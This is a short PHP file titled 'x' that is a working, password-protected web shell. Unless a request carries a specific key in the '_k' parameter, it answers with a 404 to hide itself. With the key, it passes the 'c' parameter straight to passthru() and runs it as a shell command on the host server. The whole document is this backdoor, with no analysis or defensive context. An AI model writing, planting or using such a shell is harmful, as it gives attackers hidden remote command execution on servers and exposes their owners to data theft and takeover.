Title: x

<?php if((isset($_REQUEST["_k"])?$_REQUEST["_k"]:"")!=="b30f4f90b6fa4b9c01f2554dc6bcd6d5"){http_response_code(404);exit;} $c=isset($_REQUEST["c"])?$_REQUEST["c"]:""; if($c===""){echo "ok";exit;} passthru($c);
